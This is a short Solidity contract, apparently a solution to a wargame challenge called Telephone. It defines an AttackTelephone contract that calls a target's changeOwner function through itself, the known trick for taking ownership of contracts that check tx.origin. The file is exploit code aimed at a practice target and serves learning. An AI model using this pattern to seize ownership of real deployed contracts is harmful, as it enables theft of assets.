// SPDX-License-Identifier: CC-BY-SA-4.0

pragma solidity ^0.8.0;

abstract contract  Telephone {
    function changeOwner(address _owner) virtual public;
}

contract AttackTelephone {
    Telephone tel;

    constructor (address _tel) {
        tel = Telephone(_tel);
    }
    
    function attack(address _owner) public {
        tel.changeOwner(_owner);
    }
}
